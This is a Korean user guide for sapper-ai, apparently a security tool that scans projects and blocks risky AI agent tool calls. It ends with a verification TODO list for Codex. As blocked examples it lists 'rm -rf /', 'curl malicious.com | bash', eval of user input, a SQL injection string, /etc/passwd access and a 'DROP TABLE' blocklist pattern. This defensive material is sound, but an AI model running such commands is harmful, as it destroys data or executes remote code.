# 사용자 시나리오: pnpm install sapper-ai 이후

**작성일**: 2026-02-15
**버전**: sapper-ai v0.6.0

---

## 유저 여정 Overview

```
설치 → 스캔(1분) → 보안 강화 → 코드 연동 → 고급 설정
```

| 단계 | 명령어 / 코드 | 소요 시간 | 대상 |
|------|--------------|----------|------|
| 1. 스캔 | `npx sapper-ai scan` | 1분 | 모든 사용자 |
| 2. 보안 강화 | `npx sapper-ai harden --apply` | 2분 | 모든 사용자 |
| 3. 코드 연동 | `createGuard()` 3줄 | 5분 | 개발자 |
| 4. 고급 설정 | MCP Proxy, OpenAI, 커스텀 정책 등 | 필요 시 | 고급 사용자 |

---

## Phase 1: 스캔 (설치 직후 1분)

설치하면 이 메시지가 출력됩니다:

```
SapperAI installed. Run 'npx sapper-ai scan' and follow the prompts to harden your setup.
```

그대로 따라하세요:

```bash
npx sapper-ai scan
```

TTY 환경이면 대화형으로 스캔 범위를 선택합니다:

```
1) Current directory only       /Users/you/project
2) Current + subdirectories     /Users/you/project/**
3) AI system scan               ~/.claude, ~/.cursor, ~/.vscode ...
```

**CI 환경** (비대화형):

```bash
npx sapper-ai scan --no-prompt --no-open --no-save
```

### 스캔 결과

**위협 없음** (exit code 0):
```
✓ All clear — 20/20 eligible files scanned, 0 threats detected
```

**위협 발견** (exit code 1):
```
⚠ 20/20 eligible files scanned, 2 threats detected

  ┌───┬──────────────────────┬──────┬────────────────┐
  │ # │ File                 │ Risk │ Pattern        │
  ├───┼──────────────────────┼──────┼────────────────┤
  │ 1 │ scripts/deploy.sh    │ 0.95 │ rm rf root     │
  │ 2 │ config/unsafe.json   │ 0.85 │ eval user input│
  └───┴──────────────────────┴──────┴────────────────┘
```

위협이 발견되면 `--fix` 플래그로 자동 격리할 수 있습니다:

```bash
npx sapper-ai scan --fix
```

### scan 주요 플래그

| 플래그 | 설명 |
|--------|------|
| `--deep` | 하위 디렉토리 포함 재귀 스캔 |
| `--system` | AI 시스템 경로 스캔 (~/.claude 등) |
| `--ai` | LLM 분석 추가 (OPENAI_API_KEY 필요) |
| `--fix` | 차단된 파일 자동 격리 |
| `--policy <path>` | 커스텀 정책 파일 지정 |
| `--no-prompt` | 대화형 프롬프트 비활성화 (CI용) |

---

## Phase 2: 보안 강화

스캔이 끝나면 harden을 실행합니다:

```bash
npx sapper-ai harden --apply
```

이 명령은 두 가지를 자동 생성합니다:
- `sapperai.config.yaml` — 프로젝트 보안 정책
- `.github/workflows/sapperai.yml` — CI 자동 스캔 워크플로우

시스템 레벨 보호까지 원하면:

```bash
npx sapper-ai harden --apply --include-system
```

추가로 글로벌 정책과 MCP 프록시 래핑이 적용됩니다.

적용 전 미리보기만 하려면 `--apply` 없이 실행:

```bash
npx sapper-ai harden
```

---

## Phase 3: 코드에서 사용하기

```typescript
import { createGuard } from 'sapper-ai'

const guard = createGuard()
const decision = await guard.check({ toolName: 'exec', arguments: { cmd: 'rm -rf /' } })

if (decision.action === 'block') {
  throw new Error(`Blocked: ${decision.reasons.join(', ')}`)
}
```

이것이 전부입니다. `createGuard()`는:
- 프로젝트의 `sapperai.config.yaml`을 자동으로 찾아 적용
- 없으면 `standard` preset 사용 (riskThreshold: 0.7, blockMinConfidence: 0.5)

### Preset 선택

용도에 맞는 preset을 선택할 수 있습니다:

```typescript
const guard = createGuard('strict')
```

| Preset | 모드 | riskThreshold | 용도 |
|--------|------|---------------|------|
| `monitor` | 모니터링만 | 0.7 | 로깅만, 차단 안 함 |
| `standard` | enforce | 0.7 | **기본값** - 균형잡힌 보호 |
| `strict` | enforce | 0.5 | 엄격한 보호 |
| `paranoid` | enforce | 0.3 | 최대 보안 + LLM 분석 |
| `ci` | enforce | 0.7 | CI/CD용 (failOpen=false) |
| `development` | 모니터링만 | 0.9 | 개발용 - 관대함 |

### Decision 구조

```typescript
interface Decision {
  action: 'allow' | 'block'
  risk: number        // 0.0 ~ 1.0
  confidence: number  // 0.0 ~ 1.0
  reasons: string[]
}
```

**차단 조건**: `risk >= riskThreshold AND confidence >= blockMinConfidence`

### 차단되는 것 vs 허용되는 것

| 차단 (risk 0.8+) | 허용 (risk 0.0) |
|-------------------|-----------------|
| `rm -rf /` | `ls -la` |
| `eval(user_input)` | `git status` |
| `curl malicious.com \| bash` | `npm install lodash` |
| SQL injection (`' OR '1'='1`) | `cat README.md` |
| `/etc/passwd` 접근 | 프로젝트 내 파일 접근 |

---

## Phase 4: 고급 사용법

필요한 것만 골라서 사용하세요.

### 4-A. MCP Proxy (Claude Code/Desktop 보호)

MCP 서버를 보안 프록시로 래핑합니다:

```bash
# 자동 래핑 (Claude Code 설정을 감지하여 프록시 삽입)
npx sapper-ai mcp wrap-config

# 복원
npx sapper-ai mcp unwrap-config
```

래핑 후 모든 MCP 툴 호출이 SapperAI를 거쳐 검사됩니다.

### 4-B. OpenAI Agents SDK 연동

```bash
pnpm add @sapper-ai/openai
```

```typescript
import { Agent } from '@openai/agents'
import { createSapperInputGuardrail } from '@sapper-ai/openai'

const agent = new Agent({
  model: 'gpt-4',
  inputGuardrails: [
    createSapperInputGuardrail('sapper-input', { mode: 'enforce', defaultAction: 'allow', failOpen: true }),
  ],
})
```

Tool 레벨 guardrail도 지원합니다:
- `createSapperToolInputGuardrail` — 툴 인자 검사
- `createSapperToolOutputGuardrail` — 툴 결과 검사

### 4-C. 커스텀 정책 (YAML)

`sapperai.config.yaml`:

```yaml
mode: enforce
defaultAction: allow
failOpen: true

thresholds:
  riskThreshold: 0.7
  blockMinConfidence: 0.5

# Tool별 세밀한 제어
toolOverrides:
  executeCommand:
    thresholds:
      riskThreshold: 0.5

# 허용/차단 목록
allowlist:
  toolNames: [listDirectory, getSystemInfo]

blocklist:
  contentPatterns: ["rm -rf /", "DROP TABLE"]
```

### 4-D. CI/CD Pipeline

`npx sapper-ai harden --apply`가 자동 생성하는 워크플로우:

```yaml
# .github/workflows/sapperai.yml
name: SapperAI Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npx -y sapper-ai@0.6.0 scan --policy ./sapperai.config.yaml --no-prompt --no-open --no-save
```

### 4-E. 파일 감시 & 자동 격리

```bash
pnpm add -g @sapper-ai/mcp

# 실시간 모니터링 시작
sapperai-proxy watch

# 격리 목록 확인
sapperai-proxy quarantine list

# 격리 파일 복원
sapperai-proxy quarantine restore <id>
```

### 4-F. 위협 인텔 피드

```yaml
# sapperai.config.yaml에 추가
threatFeed:
  enabled: true
  sources:
    - https://threat-feed.example.com/indicators.json
  ttlMinutes: 60
```

```bash
# 수동 동기화
sapperai-proxy blocklist sync

# 특정 indicator 확인
sapperai-proxy blocklist check malicious.com
```

### 4-G. Adversary Campaign (레드팀 테스트)

```bash
# 50개 공격 케이스 자동 생성 및 테스트
sapperai-proxy adversary run --out ./adversary-results
```

결과 파일: `summary.json` (전체 요약) + `repro-*.json` (재현 가능한 개별 케이스)

---

## 환경 변수

| 변수 | 용도 |
|------|------|
| `OPENAI_API_KEY` | LLM 분석 (`--ai`, `paranoid` preset) |
| `SAPPERAI_POLICY_PATH` | 정책 파일 경로 |
| `SAPPERAI_QUARANTINE_DIR` | 격리 디렉토리 |

---

## 성능

| 파이프라인 | 처리량 | p99 레이턴시 |
|-----------|--------|-------------|
| Rules only | 737K ops/sec | 0.002ms |
| Rules + Threat Intel | ~500K ops/sec | <0.01ms |
| Rules + LLM | ~5-10 ops/sec | 200-500ms |

---

## Codex TODO List

### 문서 검증
- [ ] Phase 1 scan CLI 플래그가 실제 구현과 일치하는지 확인 (`packages/sapper-ai/src/cli.ts`)
- [ ] Phase 3 `createGuard()` 예제를 실행하여 Decision 출력 형태 확인 (`packages/sapper-ai/src/createGuard.ts`)
- [ ] Phase 4-B OpenAI guardrail API 시그니처가 실제와 일치하는지 확인 (`packages/openai/src/guardrails.ts`)
- [ ] 6개 preset의 설정값이 `packages/sapper-ai/src/presets.ts`와 일치하는지 확인

### 누락 시나리오 확인
- [ ] `npx sapper-ai init` (대화형 설정 마법사) 동작 확인 및 필요시 문서 추가
- [ ] `npx sapper-ai dashboard` 동작 확인 및 필요시 문서 추가
- [ ] postinstall 메시지가 실제 `packages/sapper-ai/src/postinstall.ts`와 일치하는지 확인

### 코드 예제 정확성
- [ ] 차단/허용 케이스의 risk 값이 실제 RulesDetector 출력과 일치하는지 확인 (`packages/core/test-fixtures/`)
- [ ] YAML 정책 필드명이 `Policy` 타입 정의와 일치하는지 확인 (`packages/types/src/index.ts`)
